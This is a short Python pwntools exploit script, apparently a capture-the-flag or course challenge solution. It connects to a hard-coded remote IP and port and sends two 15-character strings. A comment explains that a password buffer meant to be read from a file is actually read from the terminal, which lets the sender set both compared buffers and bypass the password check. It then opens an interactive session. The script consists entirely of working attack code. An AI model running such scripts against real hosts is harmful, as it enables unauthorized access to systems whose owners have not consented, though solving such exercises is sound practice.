from pwn import *

r = remote('140.113.207.233',8831)
"""
It seems that password_buf1 will read from password file
In face, it will read from terminal
Hence, password_buf1 and password_buf2 can set by ourself
"""
r.sendline('K' * 15)
r.recvuntil(': ')
r.sendline('A' * 15)

r.interactive()
